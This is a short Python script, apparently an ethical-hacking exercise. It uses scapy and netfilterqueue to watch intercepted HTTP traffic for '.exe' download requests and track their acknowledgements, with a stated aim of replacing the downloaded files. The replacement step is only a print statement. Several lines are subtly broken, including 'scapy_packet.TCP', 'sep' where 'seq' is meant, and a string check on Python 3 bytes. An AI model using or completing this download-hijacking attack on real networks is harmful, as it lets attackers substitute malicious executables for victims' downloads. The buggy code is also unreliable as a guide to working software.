#! /usr/bin/python3

import scapy.all as scapy
import netfilterqueue

ack_list = []

# Function that allow to intercept files that are going to be downloaded and then replace it
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if '.exe' in scapy_packet[scapy.Raw].load:
                print('[+] exe Request')
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy_packet.TCP].sport == 80:
            if scapy_packet[scapy_packet.TCP].sep in ack_list:
                print('[+] Replacing file...')
                print(scapy_packet.show())

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


